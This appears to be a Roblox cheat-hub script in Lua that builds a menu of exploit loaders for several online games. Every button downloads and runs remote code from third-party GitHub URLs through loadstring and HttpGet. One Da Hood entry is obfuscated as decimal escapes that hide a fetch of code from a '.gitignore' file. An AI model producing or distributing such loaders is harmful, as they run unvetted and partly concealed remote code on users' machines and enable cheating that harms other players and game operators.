-- init
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/K1NM4/gui/main/Gui.txt"))()
local venyx = library.new("Frozen Hub", 5013109572)

-- themes
local themes = {
Background = Color3.fromRGB(0, 34, 36),
Glow = Color3.fromRGB(0, 95, 104),
Accent = Color3.fromRGB(10, 10, 10),
LightContrast = Color3.fromRGB(0, 34, 36),
DarkContrast = Color3.fromRGB(14, 14, 14),  
TextColor = Color3.fromRGB(0, 255, 244)
}

-- first page
local page = venyx:addPage("MAIN", 5012544693)
local AllStar = page:addSection("All Star")
local Arsenal = page:addSection("Arsenal")
local CounterBlox = page:addSection("Counter Blox")
local Dahood = page:addSection("Da hood")

AllStar:addButton("Karma Panda", function()
print(loadstring(game:HttpGet('https://raw.githubusercontent.com/KarmaPanda/Roblox/main/astd-aio.lua'))())
end)
AllStar:addButton("IDK", function()
print(loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperOuro/Lua-Scripts/main/all_star_tower_defense.lua"))())
end)

Arsenal:addButton("V.G. Hub", function()
print(loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))())
end)

Arsenal:addButton("Dark Hub", function()
print(loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))())
end)

CounterBlox:addButton("Dark Hub", function()
print(loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))())
end)

CounterBlox:addButton("IDK", function()
print(loadstring(game:HttpGet('https://raw.githubusercontent.com/venosu/Hex-Hub/main/hexhub.lua'))())
end)

Dahood:addButton("IDK", function()
print(loadstring(game:HttpGet("https://raw.githubusercontent.com/nighter132/Faded/main/YesEpic", true))())
end)

Dahood:addButton("IDK", function()
print(loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\86\97\110\105\115\50\53\50\47\118\97\108\105\97\110\116\47\109\97\105\110\47\46\103\105\116\105\103\110\111\114\101\34\41\44\32\116\114\117\101\41\41\40\41\10")())
end)

-- second page
local page = venyx:addPage("MISC", 6306230437)
local ui = page:addSection("Toggle UI")

ui:addKeybind("Toggle Keybind", Enum.KeyCode.RightControl, function()
print("Activated Keybind")
venyx:toggle()
end, function()
print("Changed Keybind")
end)

-- third page
local theme = venyx:addPage("Theme", 5012544693)
local colors = theme:addSection("Colors")

for theme, color in pairs(themes) do -- all in one theme changer, i know, im cool
colors:addColorPicker(theme, color, function(color3)
venyx:setTheme(theme, color3)
end)
end

-- fourth page
local page = venyx:addPage("Credit", 6031075938)
local cred = page:addSection("Credit")

cred:addButton("DISCORD - ! K1NM4#0001", function()
print("Discord")
end)

cred:addButton("DISCORD - e54pdXBH2B", function()
print("Discord Server")
end)
